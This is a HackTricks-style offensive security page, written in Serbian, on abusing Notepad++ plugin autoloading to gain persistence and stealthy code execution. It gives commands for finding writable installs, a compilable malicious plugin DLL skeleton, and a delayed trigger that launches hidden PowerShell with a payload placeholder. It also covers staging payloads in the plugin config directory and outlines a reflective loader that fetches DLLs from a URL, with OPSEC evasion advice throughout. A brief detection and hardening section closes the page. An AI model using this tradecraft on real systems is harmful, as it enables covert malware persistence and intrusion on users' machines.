# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ će pri pokretanju **autoload-ovati svaki plugin DLL pronađen u svojim `plugins` podfolderima**. Ubacivanje malicioznog plugina u bilo koju **writable Notepad++ instalaciju** omogućava izvršavanje koda unutar `notepad++.exe` svaki put kada se editor pokrene, što može da se zloupotrebi za **persistence**, stealthy **initial execution**, ili kao **in-process loader** ako je editor pokrenut elevated.

Od **Notepad++ 7.6+** očekivani raspored za ručnu instalaciju je **jedan podfolder po pluginu** (`plugins\<PluginName>\<PluginName>.dll`). U **portable mode** (prisustvo `doLocalConf.xml` pored `notepad++.exe`), čitavo application stablo ostaje lokalno za taj direktorijum, što često pretvara kopirane/admin tool bundle-ove u lako user-writable execution surface.

## Writable plugin locations
- Standardna instalacija: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (obično zahteva admin prava za upis).
- Writable opcije za low-privileged operatore:
- Koristite **portable Notepad++ build** u folderu koji je user-writable.
- Kopirajte `C:\Program Files\Notepad++` na path pod kontrolom korisnika (npr. `%LOCALAPPDATA%\npp\`) i pokrenite `notepad++.exe` odatle.
- Tražite **admin tool bundles**, raspakovane zip kopije, ili help-desk toolkite koji već sadrže `doLocalConf.xml` i nalaze se van `Program Files`.
- Svaki plugin dobija svoj podfolder ispod `plugins` i automatski se učitava pri startup-u; stavke menija se pojavljuju pod **Plugins**.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Tačke učitavanja plugina (izvršne primitive)
Notepad++ očekuje određene **exported functions**. Sve se pozivaju tokom inicijalizacije, što daje više izvršnih površina:
- **`DllMain`** — pokreće se odmah pri učitavanju DLL-a (prva tačka izvršenja).
- **`setInfo(NppData)`** — poziva se jednom pri učitavanju da obezbedi Notepad++ handle-ove; tipično mesto za registraciju stavki menija.
- **`getName()`** — vraća ime plugina prikazano u meniju.
- **`getFuncsArray(int *nbF)`** — vraća komande menija; čak i ako je prazno, poziva se tokom startup-a.
- **`beNotified(SCNotification*)`** — prima Notepad++ / Scintilla događaje (korisno za odlaganje payloads-a dok korisnik ne izvrši akciju ili dok se ne desi događaj u editoru).
- **`messageProc(UINT, WPARAM, LPARAM)`** — handler za poruke, koristan za veće razmene podataka.
- **`isUnicode()`** — flag kompatibilnosti koji se proverava pri učitavanju.

Većina export-ova može da se implementira kao **stubs**; izvršenje može da se desi iz `DllMain` ili bilo kog callback-a iznad tokom autoload.

## Minimalni maliciozni plugin skeleton
Kompajliraj DLL sa očekivanim export-ovima i smesti ga u `plugins\\MyNewPlugin\\MyNewPlugin.dll` unutar writable Notepad++ foldera:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Izgradite DLL (Visual Studio/MinGW).
2. Napravite podfolder za plugin unutar `plugins` i ubacite DLL unutra.
3. Ponovo pokrenite Notepad++; DLL se automatski učitava, izvršavajući `DllMain` i naknadne callbacks.

## Low-noise trigger pattern via `beNotified`
Za OPSEC, mnogi payloads ne bi trebalo da se pokreću iz `DllMain`. Tiši pattern je da se plugin učita čisto, a zatim da se izvrši tek posle realističnog editor event-a kao što je **startup complete**, **buffer activation**, ili **first typed character**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Ovo se bolje uklapa u javna ofanzivna istraživanja nego bučan `DllMain` beacon: DLL se i dalje učitava automatski pri startovanju, ali se zlonamerna radnja odlaže dok Notepad++ ne izgleda kao da se zaista koristi.

## Korišćenje direktorijuma za konfiguraciju pluginova kao sekundarne pohrane
Notepad++ izlaže `NPPM_GETPLUGINSCONFIGDIR`, koji vraća **direktorijum za konfiguraciju pluginova trenutnog korisnika**. Zlonamerni plugin može da iskoristi ovo da DLL na disku ostane minimalan, dok se šifrovana konfiguracija, staged payloads ili tasking fajlovi čuvaju u putanji koja se uklapa u normalno stanje pluginova.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operationalno, ovo je korisno kada želite:
- mali autoloaded bootstrap DLL;
- per-user tasking bez ponovnog diranja glavnog plugin binara;
- da odvojite **autoload trigger** od težeg drugog stage-a.

## Reflective loader plugin pattern
Weaponized plugin može da pretvori Notepad++ u **reflective DLL loader**:
- Prikaže minimalni UI/menu unos (npr. "LoadDLL").
- Prihvata **file path** ili **URL** za preuzimanje payload DLL-a.
- Reflectively mapira DLL u trenutni process i poziva exported entry point (npr. loader funkciju unutar preuzetog DLL-a).
- Prednost: ponovna upotreba benigno izgledajućeg GUI procesa umesto pokretanja novog loader-a; payload nasleđuje integritet `notepad++.exe` (uključujući elevated contexts).
- Trade-offs: ostavljanje **unsigned plugin DLL** na disku je upadljivo; praktična varijanta je da se autoloaded plugin koristi samo kao stub, a da pravi implant ostane encrypted/staged drugde.

## Detection and hardening notes
- Blokirajte ili pratite **writes to Notepad++ plugin directories** (uključujući portable kopije u user profiles); omogućite controlled folder access ili application allowlisting.
- Alarmirajte na **new unsigned DLLs** u okviru `plugins`, promene u portable Notepad++ tree-ovima i neuobičajene **child processes/network activity** iz `notepad++.exe`.
- Postavite baseline za legitimne plugine i istražite svaki novi DLL koji eksportuje normalan Notepad++ plugin interface, ali istovremeno pokreće shells, PowerShell ili network beacons.
- Nametnite instalaciju pluginova isključivo preko **Plugins Admin**, i ograničite izvršavanje portable kopija iz untrusted paths.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
